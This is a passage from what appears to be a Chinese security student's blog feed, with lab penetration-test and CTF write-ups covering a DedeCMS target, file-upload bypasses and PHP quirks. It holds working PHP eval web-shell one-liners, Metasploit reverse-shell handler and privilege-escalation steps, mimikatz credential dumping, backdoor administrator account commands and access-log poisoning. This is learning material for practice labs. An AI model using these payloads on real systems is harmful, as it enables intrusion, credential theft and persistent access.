src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261114178.png" alt="image-20230726111408035"></p><p>在此之前先开启监听</p><p><code>msfconsole</code></p><p><code>use exploit/multi/handler</code></p><p><code>set payload windows/meterpreter/reverse_tcp</code></p><p><code>set lhost 192.168.x.x</code></p><p><code>set lport xx ()随便空端口号就行)</code></p><p><code>run</code></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261512384.png" alt="image-20230724145454737"></p><p>等待上线</p><p>上线以后检测提权的漏洞 </p><p><code>use post/multi/recon/local_exploit_suggester</code></p><p><code>set session 1</code></p><p><code>run</code></p><p>有可能会提示检测中途断开，更新一下msf</p><p>看一下能用的漏洞模块</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261512838.png" alt="image-20230725220840944"></p><p>利用一下，提权完毕</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261509599.png" alt="image-20230725221029006"></p><h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><p>后渗透就感觉很刑了</p><p>多个方法玩转主机</p><p>help查看能用的功能 但是呢这种英文版肯定是不适合我这种废物的</p><p>所以呢肯定得搞一个中文版看看<a href="https://blog.csdn.net/weixin_45605352/article/details/115824811">(Meterpreter命令详解）</a></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261530835.png" alt="image-20230726153009757"></p><p>要是进了shell发现奇奇怪怪的玄学问题那也只好全部关掉重新抓个进去用了</p><p>meterpreter 是可以加载很多模块进行利用的</p><h3 id="模块利用"><a href="#模块利用" class="headerlink" title="模块利用"></a>模块利用</h3><p>我是先学了<strong>kiwi</strong>模块</p><p>这个首先得load kiwi加载模块</p><p>其次得关注一下系统的架构 64x的要把进程迁到64x进程中 kiwi默认实现32x的</p><p>sysinfo看系统信息</p><p>ps看进程 </p><p>migrate [PID]换进程</p><p>具体可以参考<a href="https://blog.csdn.net/weixin_45588247/article/details/119497964">MSF中kiwi(mimikatz)模块的使用</a></p><p>这个是shell中主机操作 <a href="https://chenchena.blog.csdn.net/article/details/124493550">后渗透主机操作_渗透后控制主机_</a>用来关关防火墙，远控桌面</p><h3 id="cmd命令"><a href="#cmd命令" class="headerlink" title="cmd命令"></a>cmd命令</h3><p>补一条拿了管理员权限增加用户命令</p><p>net user [name] [paaswd] &#x2F;add  ##增加用户</p><p>net localgroup ##查看用户权限</p><p>net user [name]# 用于查看用户的相关信息，可以看用户组的改变</p><p>net localgroup Adminstrators(组) [name] &#x2F;add</p><h2 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h2><h3 id="文件头和文件尾"><a href="#文件头和文件尾" class="headerlink" title="文件头和文件尾"></a>文件头和文件尾</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java">JPEG (jpg)，             　文件头：FFD8FF　　　　　　　　　　　　　　　　　　　　　　　 文件尾：FF D9　　　　　　　　　　　　　　　<br><span class="hljs-title function_">PNG</span> <span class="hljs-params">(png)</span>，            　　 文件头：<span class="hljs-number">89504E47</span>　　　　　　　　　　　　　　　　　　　　　　文件尾：AE <span class="hljs-number">42</span> <span class="hljs-number">60</span> <span class="hljs-number">82</span><br>GIF (gif)，              　　文件头：<span class="hljs-number">47494638</span>　　　　　　　　　　　　　　　　　　　　　　文件尾：<span class="hljs-number">00</span> 3B                                 ZIP <span class="hljs-title function_">Archive</span> <span class="hljs-params">(zip)</span>，           文件头：504B0304　　　　　　　　　　　　　　　　　　　　　　文件尾：<span class="hljs-number">50</span> 4B<br><br><span class="hljs-title function_">TIFF</span> <span class="hljs-params">(tif)</span>，              　  文件头：49492A00　　　　　　　　　　　　　　　　　　　　　　文件尾：<br>Windows <span class="hljs-title function_">Bitmap</span> <span class="hljs-params">(bmp)</span>，      文件头：<span class="hljs-number">424D</span>　　　　　　　　　　　　　　　　　　　　　　　　 文件尾：<br>CAD (dwg)，               文件头：<span class="hljs-number">41433130</span>　　　　　　　　　　　　　　　　　　　　　　文件尾：<br>Adobe <span class="hljs-title function_">Photoshop</span> <span class="hljs-params">(psd)</span>，      文件头：<span class="hljs-number">38425053</span>　　　　　　　　　　　　　　　　　　　　　　文件尾：<br>Rich Text <span class="hljs-title function_">Format</span> <span class="hljs-params">(rtf)</span>，       文件头：7B5C727466　　　　　　　　　　　　　　　　　　　　  文件尾：<br>XML (xml)，                文件头：3C3F786D6C　　　　　　　　　　　　　　　　　　　　 文件尾：<br>HTML (html)，              文件头：68746D6C3E<br>Email [thorough only] (eml)，   文件头：44656C69766572792D646174653A<br>Outlook <span class="hljs-title function_">Express</span> <span class="hljs-params">(dbx)</span>，       文件头：CFAD12FEC5FD746F<br><span class="hljs-title function_">Outlook</span> <span class="hljs-params">(pst)</span>，             文件头：2142444E<br>MS Word/Excel (xls.or.doc)，    文件头：D0CF11E0<br>MS <span class="hljs-title function_">Access</span> <span class="hljs-params">(mdb)</span>，           文件头：5374616E64617264204A<br><span class="hljs-title function_">WordPerfect</span> <span class="hljs-params">(wpd)</span>，          文件头：FF575043<br>Adobe <span class="hljs-title function_">Acrobat</span> <span class="hljs-params">(pdf)</span>，        文件头：255044462D312E<br><span class="hljs-title function_">Quicken</span> <span class="hljs-params">(qdf)</span>，             文件头：AC9EBD8F<br>Windows <span class="hljs-title function_">Password</span> <span class="hljs-params">(pwl)</span>，     文件头：E3828596<br><br>RAR <span class="hljs-title function_">Archive</span> <span class="hljs-params">(rar)</span>，           文件头：<span class="hljs-number">52617221</span><br>Wave (wav)，               文件头：<span class="hljs-number">57415645</span><br>AVI (avi)，                 文件头：<span class="hljs-number">41564920</span><br>Real <span class="hljs-title function_">Audio</span> <span class="hljs-params">(ram)</span>，           文件头：2E7261FD<br>Real <span class="hljs-title function_">Media</span> <span class="hljs-params">(rm)</span>，            文件头：2E524D46<br><span class="hljs-title function_">MPEG</span> <span class="hljs-params">(mpg)</span>，              文件头：000001BA<br><span class="hljs-title function_">MPEG</span> <span class="hljs-params">(mpg)</span>，              文件头：000001B3<br><span class="hljs-title function_">Quicktime</span> <span class="hljs-params">(mov)</span>，           文件头：6D6F6F76<br>Windows <span class="hljs-title function_">Media</span> <span class="hljs-params">(asf)</span>，        文件头：3026B2758E66CF11<br><span class="hljs-title function_">MIDI</span> <span class="hljs-params">(mid)</span>，                文件头：4D546864<br></code></pre></td></tr></table></figure><p>EXE文件的反编译和分析</p><p>首先把exe放入detect it easy 查看其打包工具</p><p><code>E:\暗月\tool\ctf工具箱\ctf工具箱\逆向工程winlinux\die_win64_portable_3.08_x64</code></p><p>然后根据列出来的打包工具进行解包</p>]]></content>
    
    
    <categories>
      
      <category>Tool</category>
      
    </categories>
    
    
    <tags>
      
      <tag>相关工具使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>暗月项目四（完整渗透测试）</title>
    <link href="/2023/07/01/penetration/%E9%A1%B9%E7%9B%AE%E5%9B%9B/"/>
    <url>/2023/07/01/penetration/%E9%A1%B9%E7%9B%AE%E5%9B%9B/</url>
    
    <content type="html"><![CDATA[<h3 id="项目四（完整渗透测试）"><a href="#项目四（完整渗透测试）" class="headerlink" title="项目四（完整渗透测试）"></a>项目四（完整渗透测试）</h3><h2 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h2><h3 id="1-nmap-sn"><a href="#1-nmap-sn" class="headerlink" title="(1)nmap-sn"></a>(1)nmap-sn</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306112054777.png" alt="image-20230611205450303"></p><h3 id="2-netdiscover-i"><a href="#2-netdiscover-i" class="headerlink" title="(2)netdiscover -i"></a>(2)netdiscover -i</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306112056939.png" alt="image-20230611205651833"></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>首先用masscan扫描</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306112103816.png" alt="image-20230611210309546"></p><p>然后再用nmap进行端口探测</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306121509909.png" alt="image-20230612150949554"></p><p>通过对端口的解析，可以看每个端口对应的服务</p><h2 id="改dns服务器地址"><a href="#改dns服务器地址" class="headerlink" title="改dns服务器地址"></a>改dns服务器地址</h2><p>发现是由dns53 端口开启的，靶机应该是有dns服务的，所以要先把dns服务器改成靶机地址</p><p>（1）Windows</p><p><img src="C:/Users/23167/AppData/Roaming/Typora/typora-user-images/image-20230612154425537.png" alt="image-20230612154425537"></p><p>（2）kali</p><p> &#x2F;etc&#x2F;resolv.conf</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306121600839.png" alt="image-20230612160048638"></p><h2 id="wfuzz爆破子域名"><a href="#wfuzz爆破子域名" class="headerlink" title="wfuzz爆破子域名"></a>wfuzz爆破子域名</h2><p>wfuzz学习地址<a href="https://blog.csdn.net/qq_45869039/article/details/108874749">wfuzz学习_wfuzz参数_</a></p><p>&#x2F;usr&#x2F;share&#x2F;amass&#x2F;wordlists&#x2F;subdomains-top1mil-110000.txt kali自带的子域名爆破字典</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306121603759.png" alt="image-20230612160330695"></p><p>new www ww2 WWW </p><h2 id="第一个网站的渗透（new-）"><a href="#第一个网站的渗透（new-）" class="headerlink" title="第一个网站的渗透（new.）"></a>第一个网站的渗透（new.）</h2><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306250951130.png" alt="image-20230625095057736"></p><p>是一个dedecms类型网站 </p><p>一般dedecms是有固定的目录结构的，那么根据目录结构能访问到其他页面</p><p>如果像我这种小白不了解dedecms的话，可以先扫描一遍该网站的目录结构</p><p>用<a href="%5B(54%E6%9D%A1%E6%B6%88%E6%81%AF">dirbuster</a> Web渗透之信息收集——目录扫描从御剑到Dirbuster_Mr. Wanderer的博客-CSDN博客](<a href="https://blog.csdn.net/Mr_Wanderer/article/details/107410457))%E5%85%88%E6%89%AB%E6%8F%8F%E4%B8%80%E8%BE%B9%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95">https://blog.csdn.net/Mr_Wanderer/article/details/107410457))先扫描一边网站目录</a> 用御剑效果差不多，看在本机还是kali里完成实验了</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251001538.png" alt="image-20230625100119420"></p><p>查看dedecms版本号，网上找对应的exp，</p><p>版本号的相对路径：&#x2F;data&#x2F;admin&#x2F;ver.txt</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251008176.png" alt="image-20230625100820990"></p><p>20150618是存在漏洞的 <a href="http://www.hekaiyu.cn/hacker/3060.html">Dedecms 20150618 注入漏洞</a></p><p>根据文章实现exp</p><p>member模块开启，可以注册登录</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251015609.png" alt="image-20230625101514441"></p><p>先注册一个账号</p><p>增加一个分类<img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251711750.png" alt="image-20230625171115401"></p><p>利用给的exp能跑出admin账号的密码md5值</p><p>该exp需要获取一个登录账号的cookie（requests包中） 需要在python2环境下运行</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251711785.png" alt="image-20230625171131658"></p><p>获得admin账号密码进行登录</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306251716192.png" alt="image-20230625171627055"></p><p>获取权限后上传小马</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307061716006.png" alt="image-20230706171558794"></p><p>拿蚁剑连后上传大马（ASPXSpy2014.aspx admin）查看是否可执行cmd文件，然后开始提权</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241107956.png" alt="image-20230724110742886"></p><p>生成攻击载荷</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241043543.png" alt="image-20230724104346468"></p><p>查看服务器可写目录，然后上传攻击载荷</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241045107.png" alt="image-20230724104545057"></p><p>反弹shell</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241112877.png" alt="image-20230724111207836"></p><p>有关msfconsole的使用可以重开一篇</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307241454779.png" alt="image-20230724145454737"></p><p>监听后连上</p><p>然后提权 首先用use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester跑一边可以利用的exp</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307252208247.png" alt="image-20230725220840944"></p><p>跑完以后就看模块利用 不会使用模块可以百度一下</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307252210072.png" alt="image-20230725221029006"></p><p>提成功了获得系统权限</p><p>然后找flag 可以先在meterpreter下先 <code>search -f *flag*</code></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261032479.png" alt="image-20230726103234108"></p><p>然后再进入shell 查看内容（玄学卡实在不行重新弹一个shell回来）</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307261033400.png" alt="image-20230726103315356"></p><h2 id="第二个域名渗透（ww2）"><a href="#第二个域名渗透（ww2）" class="headerlink" title="第二个域名渗透（ww2）"></a>第二个域名渗透（ww2）</h2><h3 id="gobuster-目录扫描"><a href="#gobuster-目录扫描" class="headerlink" title="gobuster 目录扫描"></a>gobuster 目录扫描</h3><p>感觉和dirbuster效果差也差不多， 具体操作 相对可以</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311009701.png" alt="image-20230731100905532"></p><p>比dirbuster功能相对多一点，能扫dns，fuzz，tftp？ 我感觉需要一个相对清楚的目录结构，dirbuster可能会更适合一点，如果是查看该网站有什么特定类型文件，那就gobuster，当然功能性上也是gobuster nice</p><p>gobuster dir -u <a href="http://ww2.cc123.com/">http://ww2.cc123.com</a> -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -x “aspx,html” -o ww2dir</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311013387.png" alt="image-20230731101327317"></p><p>扫完简单看一下有哪些aspx和html，html占据较大部分，有一些aspx可以实现动态交互，然后找漏洞</p><h3 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h3><p>老的静态网站， sql语言   select * from ### username&#x3D;‘  ’ and password &#x3D; ‘#####’</p><p>存在注入select * from ### username&#x3D;‘ xxxx - - ’ and password &#x3D; ‘#####’</p><p>注释掉后面的代码，从而绕过</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311533391.png" alt="image-20230731153300162"></p><p>message.aspx存在xss漏洞</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311541727.png" alt="image-20230731154125653"></p><p>这个留言留到admin管理系统中</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311543608.png" alt="image-20230731154322534"></p><p>附一条xss常见攻击脚本<a href="https://www.jianshu.com/p/36b3578a6629">XSS攻击常识及常见的XSS攻击脚本汇总</a>     和笼统危害<a href="https://zhuanlan.zhihu.com/p/353097872">XSS漏洞及利用</a></p><p>本地是搭建了xsstool利用工具的  admin 1234567</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311733681.png" alt="image-20230731173313399"></p>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传刷题</title>
    <link href="/2023/06/06/web/web2/"/>
    <url>/2023/06/06/web/web2/</url>
    
    <content type="html"><![CDATA[<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h2 id="Web151"><a href="#Web151" class="headerlink" title="Web151"></a>Web151</h2><blockquote><p>（前端验证）</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071533948.png" alt="image1"></p><blockquote><p>在前端会有一些对后缀的过滤，前端过滤就进HTML检查元素把里面的限制语句直接删掉或者改成要上传的后缀名就能上传了，最简单方法就抓包改后缀就行了</p><p>上传一个小马就能rce</p></blockquote><h3 id="Web152"><a href="#Web152" class="headerlink" title="Web152"></a>Web152</h3><blockquote><p>(后端验证）</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071551531.png" alt="image3"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071552063.png" alt="image4"></p><blockquote><p>更改content-type在HTTP协议消息头中，使用Content-Type来表示媒体类型信息。它被用来告诉服务端如何处理请求的数据，以及告诉客户端（一般是浏览器）如何解析响应的数据，比如显示图片，解析html或仅仅展示一个文本等。</p><p><a href="https://blog.csdn.net/qq_14869093/article/details/86307084">Content-Type 详解_</a></p><p>抓包后修改content-type 再发包就能绕过后端过滤</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071553673.png" alt="image5"></p><h3 id="Web153"><a href="#Web153" class="headerlink" title="Web153"></a>Web153</h3><blockquote><p>ini文件包含绕过</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071605355.png" alt="image5"></p><blockquote><p>upload文件夹能够直接访问，说明有index.php文件，所以能够用.user.ini<a href="https://blog.csdn.net/weixin_52635170/article/details/126962920">.user.ini漏洞</a></p></blockquote><blockquote><p>.user.ini中两个中的配置就是auto_prepend_file和auto_append_file。这两个配置的意思就是：我们指定一个文件（如1.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），相当于在index.php中插入一句：require(.&#x2F;1.jpg)。这两个设置的区别只是在于auto_prepend_file是在文件前插入，auto_append_file在文件最后插入。</p></blockquote><blockquote><p>利用.user.ini的前提是服务器开启了CGI或者FastCGI，并且上传文件的存储路径下有index.php可执行文件。</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071708978.png" alt="image8"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071709155.png" alt="image9"></p><blockquote><p>这样index.php就包含了1.txt的马然后rce</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071710997.png" alt="image10"></p><blockquote><p>也可以用日志文件包含做</p></blockquote><h3 id="Web154"><a href="#Web154" class="headerlink" title="Web154"></a>Web154</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071710482.png" alt="image11"></p><blockquote><p>过滤了”php”内容 php语言对函数名、方法名、类名大小写不敏感 使用大写 或者短标签</p></blockquote><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);？&gt; <span class="hljs-meta">&lt;?</span>PHP <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);？&gt;<br></code></pre></td></tr></table></figure></blockquote><blockquote><p>没限制就继续用.user.ini漏洞写入包含文件</p></blockquote><h3 id="Web155"><a href="#Web155" class="headerlink" title="Web155"></a>Web155</h3><blockquote><p>同上</p></blockquote><h3 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h3><blockquote><p>过滤了[]，用{}代替即可:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>&#123;cmd&#125;);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></blockquote><h3 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h3><blockquote><p>多过滤了分号，改一下即可：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;<span class="hljs-string">?=</span><span class="hljs-keyword">include</span><span class="hljs-string">&quot;/var/lo&quot;</span>.<span class="hljs-string">&quot;g/nginx/access.lo&quot;</span>.<span class="hljs-string">&quot;g&quot;</span><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure></blockquote><h3 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h3><blockquote><p>同上</p></blockquote><h3 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h3><blockquote><p>同上</p></blockquote><h3 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h3><blockquote><p>本题多过滤了括号和反引号，而且还过滤了log，日志包含也能做，用字符串拼接(php中用.来连接字符串)构造log:</p></blockquote><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">include</span><span class="hljs-string">&quot;/var/lo&quot;</span>.<span class="hljs-string">&quot;g/nginx/access.lo&quot;</span>.<span class="hljs-string">&quot;g&quot;</span><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_POST[<span class="hljs-number">1</span>]); </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><blockquote><p>这种小马在&lt;?被过滤时用</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071745551.png" alt="image20"></p><blockquote><p>然后上传.user.ini包含该文件即可：auto_append_file&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;hack.png</p></blockquote><blockquote><p>然后在UA头改为想执行的命令访问主页，最后访问&#x2F;upload，看看log里命令执行结果即可即可</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071746472.png" alt="image-20230607174625433"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow刷题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php特性刷题</title>
    <link href="/2023/06/06/web/web3/"/>
    <url>/2023/06/06/web/web3/</url>
    
    <content type="html"><![CDATA[<h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><h3 id="Web89"><a href="#Web89" class="headerlink" title="Web89"></a>Web89</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071000076.png" alt="image-20230607100007017"></p><blockquote><p>数组绕过原理：preg_match()只能处理字符串，当传入的subject是数组时会返回false intval（）用于获取变量的整数值。也可用于进制的转化</p></blockquote><blockquote><p>PHP 是一门弱类型语言不必向 PHP 声明该变量的数据类型。PHP 会根据变量的值，自动把变量转换为正确的数据类型。 </p></blockquote><h3 id="Web90"><a href="#Web90" class="headerlink" title="Web90"></a>Web90</h3><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071000168.png" alt="image-20230607100032127"  /><blockquote><p>字符绕过：intval()而言，如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。如果字符串第一个是‘-’，则从第二个开始算起。如果参数是符点数，则返回他取整之后的值。</p></blockquote><blockquote><p>int intval ( mixed $var [, int $base &#x3D; 10 ] )</p></blockquote><blockquote><p>参数说明：</p></blockquote><blockquote><p>$var：要转换成 integer 的数量值。</p></blockquote><blockquote><p>$base：转化所使用的进制。</p></blockquote><blockquote><p>如果 base 是 0，通过检测 var 的格式来决定使用的进制：</p></blockquote><blockquote><p>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，如果字符串以 “0” 开始，使用 8 进制(octal)；否则，将使用 10 进制 (decimal)。</p></blockquote><h3 id="Web91"><a href="#Web91" class="headerlink" title="Web91"></a>Web91</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071518574.png" alt="image-20230607151820515"></p><blockquote><p>一个正则判断</p></blockquote><blockquote><p>去看就完事了<a href="https://blog.csdn.net/xuemoyao/article/details/8033138?ops_request_misc=%7B%22request_id%22:%22165222532616782391878742%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=165222532616782391878742&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-8033138-null-null.142%5Ev9%5Epc_search_result_control_group,157%5Ev4%5Econtrol&utm_term=%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F&spm=1018.2226.3001.4187">正则表达式全解析+正则表达式例子详解</a></p><p>m是多行匹配，i是忽略大小写</p></blockquote><blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071520576.png" alt="clip_image007">匹配变量中多行开头到结尾要有php</p></blockquote><blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071520696.png" alt="clip_image008">匹配变量中一行行开头到结尾要有php</p></blockquote><h3 id="Web92"><a href="#Web92" class="headerlink" title="Web92"></a>Web92</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071520853.png" alt="clip_image010"></p><blockquote><p>关于intval（）函数的用法看web90</p><p>这道题意思是num这个变量转化为八进制是4476，还是考intval的用法</p></blockquote><h3 id="Web93"><a href="#Web93" class="headerlink" title="Web93"></a>Web93</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521259.png" alt="clip_image011"></p><blockquote><p>相比上一题多了匹配正则 不能出现字母 断了16进制（0x） 8进制（0）不受影响，进制绕过</p></blockquote><h3 id="Web94"><a href="#Web94" class="headerlink" title="Web94"></a>Web94</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521144.png" alt="clip_image013"></p><blockquote><p>strpos() 函数返回字符串在另一字符串中第一次出现的位置。如果存在，返回数字，如果没有找到该字符串，则返回false.所以num值中要出现0，算一个比较函数</p></blockquote><blockquote><p>第三个判断就限制了八进制 如果num&#x3D;&#x3D;010574 strpos()返回字符串第一次出现的位置就是0，第三个判断就满足了就绕不过了</p></blockquote><blockquote><p>浮点绕过</p></blockquote><h3 id="Web95"><a href="#Web95" class="headerlink" title="Web95"></a>Web95</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521951.png" alt="clip_image015"></p><blockquote><p>Intval（）函数会将输入的数前的“空格”和“+”（有且仅有）可当成输入的数为正数，一个绕过方法</p></blockquote><h3 id="Web96"><a href="#Web96" class="headerlink" title="Web96"></a>Web96</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521040.png" alt="clip_image017"></p><blockquote><p>Highlight_file可带路径，所以变量可以是路径</p></blockquote><h3 id="Web97"><a href="#Web97" class="headerlink" title="Web97"></a>Web97</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521079.png" alt="clip_image019"></p><blockquote><p>考察md5加密：<a href="https://blog.csdn.net/wangyuxiang946/article/details/119845182?ops_request_misc=%7B%22request_id%22:%22165261132516782184692274%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=165261132516782184692274&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-119845182-null-null.142%5Ev9%5Epc_search_result_control_group,157%5Ev4%5Econtrol&utm_term=md5%E6%95%B0%E7%BB%84&spm=1018.2226.3001.4187"> MD5加密漏洞(MD5绕过方式-0e绕过&#x2F;数组绕过&#x2F;MD5碰撞&#x2F;MD5SQL注入)</a></p></blockquote><blockquote><p>MD5是一种散列函数,是哈希算法的一种,可以将任意长度的输入,通过散列算法变换成128位的散列值</p></blockquote><blockquote><p>MD5加密有4种绕过方式1、0e绕过1、数组绕过1、MD5碰撞1、MD5SQL注入</p></blockquote><blockquote><p>这道题需要用到&#x3D;&#x3D;&#x3D;强比较（判断内容的基础上,还会判断类型是否相同），所以不能用0e弱比较绕过，用数组绕过</p><p>由于md5函数无法处理数组,会返回null,所以md5加密后的结果是下面这样</p><p>null &#x3D;&#x3D;&#x3D; null 满足条件就可以绕过了</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071522290.png" alt="clip_image021"></p><h3 id="Web98"><a href="#Web98" class="headerlink" title="Web98"></a>Web98</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071522985.png" 